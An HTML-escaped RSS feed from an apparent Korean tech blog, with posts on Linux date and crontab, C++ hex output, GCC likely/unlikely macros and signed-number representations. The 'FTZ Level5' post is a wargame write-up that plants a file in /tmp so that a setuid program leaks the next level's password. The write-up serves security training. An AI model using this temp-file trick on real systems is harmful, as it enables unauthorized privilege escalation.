mommy&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt; I think I know what a &lt;span class=&quot;token function&quot;&gt;file&lt;/span&gt; descriptor is&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[Linux Time]]></title><description><![CDATA[…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 11 Jan 2016 12:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스에서 시간을 변경하는 방법은 &lt;code class=&quot;language-text&quot;&gt;date -s&lt;/code&gt;옵션을 이용하여 변경할 수 있다.&lt;/p&gt;
&lt;p&gt;시간이 일치하지 않는다면, &lt;code class=&quot;language-text&quot;&gt;date -s &quot;연-월-일 시:분:초&quot;&lt;/code&gt; 형식으로 값을 수정할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# date -s &quot;2016-01-11 02:19:00&quot;;date;&lt;/span&gt;
Mon Jan &lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt; 02:19:00 KST &lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;
Mon Jan &lt;span class=&quot;token number&quot;&gt;11&lt;/span&gt; 02:19:00 KST &lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;만약 일만 바꾸고 싶으면 위처럼 하면 된다. 예를들어 일을 선택한 것이지, 원하는 값만 바꾸고 싶을 경우 이와 유사한 형식을 사용하면 된다.&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;&quot;&quot;&lt;/strong&gt;안에 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;&lt;/strong&gt;를 사용했는데, 이는 bash에서 명령을 처리하여 그 출력 결과를 그 위치에 대입한다고 생각하면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# date +%Y-%m&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;-01&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 같이 +를 이용하면 원하는 형식으로 출력할 수 있다. 다음과 같은 형식을 사용할 수 있다.&lt;/p&gt;
&lt;p&gt;중간에 원하는 문자가 있을 경우 그냥 넣으면 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;%Y : 연
%m : 월
%d : 일
%H : 시
%M : 분
%S : 초&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이와 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;&lt;/strong&gt;를 이용하면 원하는 값을 만들어 낼 수 있다.&lt;/p&gt;
&lt;p&gt;이를 이용하여 수정하지 않을 값은 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;&lt;/code&gt;&lt;/strong&gt;를 이용해 출력하고, 수정할 값은 직접 입력하여 최종적으로 원하는 시간을 만들 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# date&lt;/span&gt;
Tue Jan &lt;span class=&quot;token number&quot;&gt;19&lt;/span&gt; 06:50:37 KST &lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이러한 시간으로 설정되어 있을때, 실제 시간은 18일 21시이다. 그 시간을 이제 정확히 바꾸고 싶은데, 바꿀 부분은 일과 시간이다.&lt;/p&gt;
&lt;p&gt;다음과 같이 사용하면 해당하는 값만 변경할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# date -s &quot;`date +%Y-%m`-18 21:`date +%M:%S`&quot;&lt;/span&gt;
Mon Jan &lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;:51:10 KST &lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;root@localhost ~&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;# date&lt;/span&gt;
Mon Jan &lt;span class=&quot;token number&quot;&gt;18&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;21&lt;/span&gt;:51:11 KST &lt;span class=&quot;token number&quot;&gt;2016&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;추가로 timezone을 설정하는 것은 &lt;code class=&quot;language-text&quot;&gt;/etc/localtime&lt;/code&gt;를 수정하면 되는데, &lt;code class=&quot;language-text&quot;&gt;/usr/share/zoneinfo&lt;/code&gt;에 각 지역별로 설정되어 있어 이를 복사하거나 링크걸면 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[Crontab]]></title><description><![CDATA[리눅스에서는 일정 시간마다 특정 명령을 실행할 수 있도록 해주는 기능인 이 있다. 이 기능을 사용하게 되면 원하는 시간대에 명령을 실행할 수 있다. 이 명령은…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Mon, 11 Jan 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;리눅스에서는 일정 시간마다 특정 명령을 실행할 수 있도록 해주는 기능인 &lt;code class=&quot;language-text&quot;&gt;crontab&lt;/code&gt;이 있다.&lt;/p&gt;
&lt;p&gt;이 기능을 사용하게 되면 원하는 시간대에 명령을 실행할 수 있다. 이 명령은 1분단위로 설정가능하다.&lt;/p&gt;
&lt;p&gt;사용은 &lt;code class=&quot;language-text&quot;&gt;crontab -e&lt;/code&gt; 명령을 이용하면 작성할 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token comment&quot;&gt;# 분 시 일 월 요일 명령&lt;/span&gt;
&lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; */2 * * yum -y update&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt; yum -y upgrade&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;다음과 같이 사용이 가능하다. &lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;은 명령의 끝을 나타내는데, 이렇게 작성할 경우 한 명령으로 2개를 처리할 수 있다.&lt;/p&gt;
&lt;p&gt;이를 해석해 보면 1번줄은 &lt;code class=&quot;language-text&quot;&gt;#(주석)&lt;/code&gt;으로 처리되어 있다.&lt;/p&gt;
&lt;p&gt;2번줄은 아무요일이나 매달 짝수(2일마다 한번)일에 03시 00분에 &lt;code class=&quot;language-text&quot;&gt;yum -y update; yum -y upgrade;&lt;/code&gt;를 실행하도록 하였다.&lt;/p&gt;
&lt;p&gt;저의 경우는 항상 명령의 끝에 &lt;strong&gt;&lt;code class=&quot;language-text&quot;&gt;;&lt;/code&gt;&lt;/strong&gt;을 붙여 crontab을 작성하는데, 어떤 경우에는 명령의 끝에 이상한 문자(^M)가 붙어 명령이 실행되지 않은 적이 있다.&lt;/p&gt;
&lt;p&gt;이 때 세미콜론(;)을 이용하여 해결했던 적이 있어, 이를 방지하기 위함도 있다.&lt;/p&gt;
&lt;p&gt;요일의 경우는 0이 일요일이고, 이 후 1씩 더해주면 된다. 즉, 6이 토요일이 되면 된다.&lt;/p&gt;
&lt;p&gt;모든 값은 특정 단위마다 실행하도록 할 수 있는데, *를 사용하면 된다.&lt;/p&gt;
&lt;p&gt;_만 사용할 경우 _/1이므로 1단위마다 실행하도록 하는 것 이다. &lt;code class=&quot;language-text&quot;&gt;*/2&lt;/code&gt;를 하게 될 경우 2가 되는 때 마다 실행이 되게 된다. 이러한 식으로 원하는 시점마다 적용이 가능하다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[C++ 16진수 출력]]></title><description><![CDATA[iomanip를 include해주고, 16진수로 출력하기 전에 를 해주면 된다.
setbase(16)대신에 hex를 사용해도 된다. setbase는 , , 만 적용이 된다. 실행을 하게되면 다음과 같은 결과를 볼 수 있다.]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sun, 10 Jan 2016 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;iomanip를 include해주고, 16진수로 출력하기 전에 &lt;code class=&quot;language-text&quot;&gt;std::cout &amp;lt;&amp;lt; std::setbase(16)&lt;/code&gt;를 해주면 된다.
setbase(16)대신에 hex를 사용해도 된다. setbase는 &lt;code class=&quot;language-text&quot;&gt;16&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;10&lt;/code&gt;, &lt;code class=&quot;language-text&quot;&gt;8&lt;/code&gt;만 적용이 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c++&quot;&gt;&lt;pre class=&quot;language-c++&quot;&gt;&lt;code class=&quot;language-c++&quot;&gt;#include &amp;lt;iostream&amp;gt;
#include &amp;lt;iomanip&amp;gt;

int main(int argc, char* argv[]) {
    int i = 100;

    std::cout &amp;lt;&amp;lt; std::setbase(16);
    std::cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; std::endl;
    std::cout &amp;lt;&amp;lt; i + 1 &amp;lt;&amp;lt; std::endl;

    std::cout &amp;lt;&amp;lt; std::setbase(10);
    std::cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; std::endl;
    std::cout &amp;lt;&amp;lt; i + 1 &amp;lt;&amp;lt; std::endl;

    std::cout &amp;lt;&amp;lt; std::hex;
    std::cout &amp;lt;&amp;lt; i &amp;lt;&amp;lt; std::endl;
    std::cout &amp;lt;&amp;lt; i + 1 &amp;lt;&amp;lt; std::endl;

    return 0;
}&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;실행을 하게되면 다음과 같은 결과를 볼 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;64
65
100
101
64
65&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[FTZ Level5]]></title><description><![CDATA[이 문제를 tmp폴더의 특성을 이용해 풀이하였다. /tmp폴더를 보게되면 sticky bit가 걸려있는데, 이를 이용해 문제를 풀 수 있다. 다른 사람의 풀이를 보게되면 race condition…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Fri, 09 Oct 2015 16:00:00 GMT</pubDate><content:encoded>&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz level5&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; hint

/usr/bin/level5 프로그램은 /tmp 디렉토리에
level5.tmp 라는 이름의 임시파일을 생성한다.

이를 이용하여 level6의 권한을 얻어라.&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 문제를 tmp폴더의 특성을 이용해 풀이하였다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz level5&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -dl /tmp
drwxrwxrwt    &lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt; root     root         &lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt; Oct  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;14&lt;/span&gt;:58 /tmp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;/tmp폴더를 보게되면 sticky bit가 걸려있는데, 이를 이용해 문제를 풀 수 있다. 다른 사람의 풀이를 보게되면 race condition을 이용하여 해결하였다.&lt;/p&gt;
&lt;p&gt;우선 &lt;code class=&quot;language-text&quot;&gt;sticky bit&lt;/code&gt;의 특성을 살펴보면 모든 권한이 있기 때문에 누구나 이 속에 있는 파일및 폴더를 수정 및 실행할 수 있다.&lt;/p&gt;
&lt;p&gt;하지만 stiky bit로 인해 소유자를 제외한 사람은 삭제를 할 수 없다. 물론 root의 경우는 삭제가 가능하다. level5파일을 살펴보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz level5&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l /usr/bin/level5
-rws--x---    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; level6   level5      &lt;span class=&quot;token number&quot;&gt;12236&lt;/span&gt; Sep &lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;span class=&quot;token number&quot;&gt;2011&lt;/span&gt; /usr/bin/level5&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;level5파일은 level6의 권한으로 실행이 되게 된다. 이 말은 root가 아니므로 다른 사용자가 된다. 다른 사용자의 경우 삭제를 하지 못한다는 뜻이다.&lt;/p&gt;
&lt;p&gt;level5의 권한으로 파일을 생성한 후 level6의 권한으로 이 &lt;strong&gt;파일을 수정&lt;/strong&gt;할 수는 있지만, &lt;strong&gt;삭제의 경우 불가능&lt;/strong&gt;하다.&lt;/p&gt;
&lt;p&gt;그러므로 level5파일이 level5.tmp파일에 답을 쓴 후 &lt;strong&gt;삭제를 하지 못하므로&lt;/strong&gt;, 안에 있는 값이 남아있게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token builtin class-name&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;&quot;&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;&gt;&gt;&lt;/span&gt; level5.tmp
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l level5.tmp
-rw-rw-r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; level5   level5          &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; Oct  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;:05 level5.tmp
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ /usr/bin/level5
&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;ls&lt;/span&gt; -l level5.tmp
-rw-rw-r--    &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt; level5   level5         &lt;span class=&quot;token number&quot;&gt;31&lt;/span&gt; Oct  &lt;span class=&quot;token number&quot;&gt;9&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;15&lt;/span&gt;:05 level5.tmp&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 실행을 하게 되면 파일의 크기가 변경되었음을 알 수 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;bash&quot;&gt;&lt;pre class=&quot;language-bash&quot;&gt;&lt;code class=&quot;language-bash&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;level5@ftz tmp&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;$ &lt;span class=&quot;token function&quot;&gt;cat&lt;/span&gt; level5.tmp
next password &lt;span class=&quot;token builtin class-name&quot;&gt;:&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</content:encoded></item><item><title><![CDATA[sign-magnitude]]></title><description><![CDATA[sign-magnitude는 전체 bit중에 최상위 bit의 값을 이용하여 부호를 판별하는 방법이다. 이 방법을 이용하면 기존에 양의 정수밖에 표현할 수 밖에 없던 값을 음수도 표현할 수 있도록 도와준다. 4bit의 환경을 예를 들겠다. 4bit…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 19 Sep 2015 16:00:00 GMT</pubDate><content:encoded>&lt;p&gt;sign-magnitude는 전체 bit중에 &lt;strong&gt;최상위 bit&lt;/strong&gt;의 값을 이용하여 부호를 판별하는 방법이다.&lt;/p&gt;
&lt;p&gt;이 방법을 이용하면 기존에 양의 정수밖에 표현할 수 밖에 없던 값을 &lt;strong&gt;음수&lt;/strong&gt;도 표현할 수 있도록 도와준다.&lt;/p&gt;
&lt;p&gt;4bit의 환경을 예를 들겠다.&lt;/p&gt;
&lt;p&gt;4bit로된 3과 -3이라는 값이 있다. 이는 bit로 표현하면&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt; 3: 0 0 1 1
-3: 1 0 1 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이 둘의 차이를 보면 맨앞인 최상위 bit만 다르다는 점이다.&lt;/p&gt;
&lt;p&gt;이 방식에는 단점이 존재한다. 가장 큰 문제점은 음수가 작아지면(절대값은 커지면) bit값은 커지게 되는데, 이를 예를 들어 알아보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;-0: 1 0 0 0
-1: 1 0 0 1
-2: 1 0 1 0
-3: 1 0 1 1
-4: 1 1 0 0
-5: 1 1 0 1
-6: 1 1 1 0
-7: 1 1 1 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;음수&lt;/code&gt;의 값은 점점 작아지는데, bit로 보게되면 값은 &lt;strong&gt;점점 커지게&lt;/strong&gt; 된다. 이와 반대로 양수의 경우를 보자.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;0: 0 0 0 0
1: 0 0 0 1
2: 0 0 1 0
3: 0 0 1 1
4: 0 1 0 0
5: 0 1 0 1
6: 0 1 1 0
7: 0 1 1 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;&lt;code class=&quot;language-text&quot;&gt;양수&lt;/code&gt;는 값이 커지면 bit로 보아도 &lt;strong&gt;값이 커지게&lt;/strong&gt; 된다.&lt;/p&gt;
&lt;p&gt;가장 큰 문제점은 양수와 음수의 계산에서 발생한다.&lt;/p&gt;
&lt;p&gt;3과 -3을 더하게 될 경우 0이 나와야 하는데, 실제로 계산을 해보게 되면 그러한 결과가 나오지 않게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt;   3 |   0 0 1 1
+ -3 | + 1 0 1 1
-----|----------
  -6 |   1 1 1 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;3과 -3을 더했는데 실제 비트를 비교해 보면 -6이 나오게 된다.&lt;/p&gt;
&lt;p&gt;이 때문에 음수와 양수의 계산에서 새롭게 정의를 해주어야 한다.&lt;/p&gt;
&lt;p&gt;두번째 문제점이 되는 이유는, 비교연산과 같은 부분에서 발생한다. 비교연산을 하게되면, 양수끼리 비교를 하게될 경우 bit로 보아서 큰값이 큰 값이 된다.&lt;/p&gt;
&lt;p&gt;하지만, &lt;code class=&quot;language-text&quot;&gt;음수&lt;/code&gt;의 경우 bit가 클 경우 실제 값은 더 작은 경우가 된다. 이 때 비교연산하는 부분을 &lt;strong&gt;따로 정의&lt;/strong&gt;를 해주어야 하므로 낭비가 발생한다.&lt;/p&gt;
&lt;p&gt;마지막 문제점은 0과 -0이 동시에 존재하는 점이다. bit로는 다른 &lt;code class=&quot;language-text&quot;&gt;0000&lt;/code&gt;과 &lt;code class=&quot;language-text&quot;&gt;1000&lt;/code&gt;이지만 실제 값은 같은 0을 가르키고 있으므로 &lt;strong&gt;낭비&lt;/strong&gt;가 생기게 된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[likely / unlikely]]></title><description><![CDATA[likely와 unlikely는 매크로로 되어있다. 매크로는 로 되어있다. __builtin_expect는 gcc에게 최적화를 예측하여 하도록 하는 키워드라고 한다. kernel컴파일은 gcc로 하게 되므로 gcc키워드를 사용한다. likely…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 19 Sep 2015 08:00:00 GMT</pubDate><content:encoded>&lt;p&gt;likely와 unlikely는 매크로로 되어있다. 매크로는 &lt;code class=&quot;language-text&quot;&gt;__builtin_expect&lt;/code&gt;로 되어있다.&lt;/p&gt;
&lt;p&gt;__builtin_expect는 gcc에게 &lt;strong&gt;최적화를 예측&lt;/strong&gt;하여 하도록 하는 키워드라고 한다.&lt;/p&gt;
&lt;p&gt;kernel컴파일은 gcc로 하게 되므로 gcc키워드를 사용한다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;likely&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;token function&quot;&gt;__builtin_expect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name function&quot;&gt;unlikely&lt;/span&gt;&lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;    &lt;span class=&quot;token function&quot;&gt;__builtin_expect&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;x&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;likely는 들어온 값인 x가 &lt;code class=&quot;language-text&quot;&gt;1&lt;/code&gt;으로 예측하여 최적화를 하라는 의미다.&lt;/p&gt;
&lt;p&gt;반대로 unlikely는 들어온 값인 x가 &lt;code class=&quot;language-text&quot;&gt;0&lt;/code&gt;으로 예측하고 최적화를 하게된다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[1의 보수]]></title><description><![CDATA[sign-magnitude를 보완하기 위해서 나온게 1의 보수이다. 1의 보수는 현재 사용하고 있는 2의 보수와 비슷하다. 이론은 간단하다. bit를 뒤집는것이 1의 보수의 원리이다. 예를 들어 표현하겠다. 4bit환경에 3과 -…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Sat, 19 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;/articles/2015-09/sign-magnitude&quot;&gt;sign-magnitude&lt;/a&gt;를 보완하기 위해서 나온게 1의 보수이다.&lt;/p&gt;
&lt;p&gt;1의 보수는 현재 사용하고 있는 2의 보수와 비슷하다.&lt;/p&gt;
&lt;p&gt;이론은 간단하다. bit를 뒤집는것이 1의 보수의 원리이다.&lt;/p&gt;
&lt;p&gt;예를 들어 표현하겠다. 4bit환경에 3과 -3이 있다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt; 3: 0 0 1 1
-3: 1 1 0 0&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 서로 반대되는 bit구성을 가지게 된다. 1의 보수에도 문제가 존재했다.&lt;/p&gt;
&lt;p&gt;sign and magnitude의 큰 문제점인 덧셈과 비교에 관한부분은 해결이 되었다. 하지만 0은 역시 2개가 존재하게 된다.&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;text&quot;&gt;&lt;pre class=&quot;language-text&quot;&gt;&lt;code class=&quot;language-text&quot;&gt; 0: 0 0 0 0
-0: 1 1 1&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;이렇게 0이 2개가 존재하게 되는데, 컴퓨터에서 -0은 의미가 없으므로 &lt;strong&gt;낭비&lt;/strong&gt;가 되는 숫자이다.&lt;/p&gt;</content:encoded></item><item><title><![CDATA[2의 보수]]></title><description><![CDATA[예전 컴퓨터에서는 sign-magnitude와 1의 보수를 사용했었다. 컴퓨터에서 음수를 표시할 때, 2의 보수를 사용하여 표시한다. 현재 대부분의 컴퓨터에서 음수를 표시할 때, 2의 보수를 사용하여 표시한다. 예를들어 8bit…]]></description><link>https://micalgenus.github.io</link><guid isPermaLink="false">https://micalgenus.github.io</guid><pubDate>Wed, 09 Sep 2015 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;예전 컴퓨터에서는 &lt;a href=&quot;/articles/2015-09/sign-magnitude&quot;&gt;sign-magnitude&lt;/a&gt;와 &lt;a href=&quot;articles/2015-09/Ones-complement&quot;&gt;1의 보수&lt;/a&gt;를 사용했었다.&lt;/p&gt;
